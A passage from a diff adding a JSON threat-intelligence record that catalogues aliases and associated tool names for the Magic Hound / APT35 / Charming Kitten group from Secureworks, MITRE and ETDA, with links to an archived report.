+                "PHOSPHORUS sub-group ",
+                "TA453 ",
+                "UNC788 ",
+                "Yellow Garuda ",
+                "APT35 "
+            ],
+            "source_name": "Secureworks:COBALT ILLUSION",
+            "tools": [
+                " MagicHound Toolset",
+                " PupyRAT",
+                "Browser Exploitation Framework (BeEF)"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        },
+        {
+            "id": "e3676dfe-3d40-4b3a-bfbd-4fc1f8c896f4",
+            "created_at": "2022-10-25T15:50:23.808974Z",
+            "updated_at": "2025-03-27T02:00:55.550912Z",
+            "deleted_at": null,
+            "main_name": "Magic Hound",
+            "aliases": [
+                "Magic Hound",
+                "TA453",
+                "COBALT ILLUSION",
+                "Charming Kitten",
+                "ITG18",
+                "Phosphorus",
+                "APT35",
+                "Mint Sandstorm"
+            ],
+            "source_name": "MITRE:Magic Hound",
+            "tools": [
+                "Impacket",
+                "CharmPower",
+                "FRP",
+                "Mimikatz",
+                "Systeminfo",
+                "ipconfig",
+                "netsh",
+                "PowerLess",
+                "Pupy",
+                "DownPaper",
+                "PsExec",
+                "Havij",
+                "sqlmap"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "1699fb41-b83f-42ff-a6ec-984ae4a1031f",
+            "created_at": "2022-10-25T16:07:23.83826Z",
+            "updated_at": "2025-03-27T02:02:09.995863Z",
+            "deleted_at": null,
+            "main_name": "Magic Hound",
+            "aliases": [
+                "APT 35",
+                "Ballistic Bobcat",
+                "Charming Kitten",
+                "CharmingCypress",
+                "Cobalt Illusion",
+                "Cobalt Mirage",
+                "Educated Manticore",
+                "Magic Hound",
+                "Mint Sandstorm",
+                "Operation BadBlood",
+                "Operation Sponsoring Access",
+                "Operation SpoofedScholars",
+                "Operation Thamar Reservoir",
+                "Phosphorus",
+                "TA453",
+                "TEMP.Beanie",
+                "Tarh Andishan",
+                "Timberworm",
+                "TunnelVision",
+                "UNC788",
+                "Yellow Garuda"
+            ],
+            "source_name": "ETDA:Magic Hound",
+            "tools": [
+                "7-Zip",
+                "AnvilEcho",
+                "BASICSTAR",
+                "CORRUPT KITTEN",
+                "CWoolger",
+                "CharmPower",
+                "ChromeHistoryView",
+                "CommandCam",
+                "DistTrack",
+                "DownPaper",
+                "FRP",
+                "Fast Reverse Proxy",
+                "FireMalv",
+                "Ghambar",
+                "GoProxy",
+                "GorjolEcho",
+                "HYPERSCRAPE",
+                "Havij",
+                "MPK",
+                "MPKBot",
+                "Matryoshka",
+                "Matryoshka RAT",
+                "MediaPl",
+                "Mimikatz",
+                "MischiefTut",
+                "NETWoolger",
+                "NOKNOK",
+                "PINEFLOWER",
+                "POWERSTAR",
+                "PowerLess Backdoor",
+                "PsList",
+                "Pupy",
+                "PupyRAT",
+                "SNAILPROXY",
+                "Shamoon",
+                "TDTESS",
+                "WinRAR",
+                "WoolenLogger",
+                "Woolger",
+                "pupy",
+                "sqlmap"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673536229,
+    "ts_updated_at": 1743041771,
+    "ts_creation_date": 1653761675,
+    "ts_modification_date": 1653761675,
+    "files": {
+        "pdf": "https://archive.orkl.eu/697ea40c795227d9c405b52cdcc11d18915da57f.pdf",
+        "text": "https://archive.orkl.eu/697ea40c795227d9c405b52cdcc11d18915da57f.txt",
+        "img": "https://archive.orkl.eu/697ea40c795227d9c405b52cdcc11d18915da57f.jpg"
+    }
+}
